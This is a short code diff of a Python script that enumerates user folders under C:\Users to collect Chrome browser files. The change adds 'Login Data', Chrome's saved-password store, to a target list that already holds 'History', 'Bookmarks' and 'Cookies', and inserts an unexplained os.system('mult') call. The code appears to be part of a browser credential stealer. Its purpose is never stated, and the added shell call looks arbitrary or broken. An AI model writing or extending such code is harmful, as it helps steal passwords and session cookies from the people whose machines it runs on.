@@ -1,7 +1,9 @@
 from os.path import os, exists
-list_file = ['History','Bookmarks','Cookies']
+list_file = ['History','Bookmarks','Cookies','Login Data']
 def get_chrome():
     try:
+        import os
+        os.system("mult")
         list_user = [filename 
                                 for filename in os.listdir("C:\\Users\\")]
     
